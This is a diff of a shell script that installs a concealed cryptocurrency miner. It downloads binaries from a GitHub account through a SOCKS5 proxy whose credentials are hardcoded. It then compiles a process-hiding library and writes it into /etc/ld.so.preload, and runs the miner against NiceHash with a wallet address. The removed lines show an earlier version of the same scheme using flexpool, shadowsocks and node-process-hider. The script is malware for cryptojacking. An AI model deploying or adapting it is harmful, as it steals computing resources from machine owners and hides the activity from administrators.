@@ -1,13 +1,8 @@
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
+#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -16,27 +11,38 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 52.203.46.122:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
+socks5 = 45.192.158.183:5799
+socks5_username = lebarankita
+socks5_password = buatTHRan
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
+echo " "
+echo " "
+
+echo ""
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
-chmod +x Transport
+echo ""
 
-apt -y install shadowsocks-libev rng-tools
+echo " "
+echo " "
 
-ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
-ph add Transport
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xfd5764de1217bdd5046649e543bdb11fbca0771f -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+./graftcp/graftcp ./bezzHash --url=ssl://3PoUHW6ssG3j2rVQxCbd1yTUd2gfPYmCy9.topka@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
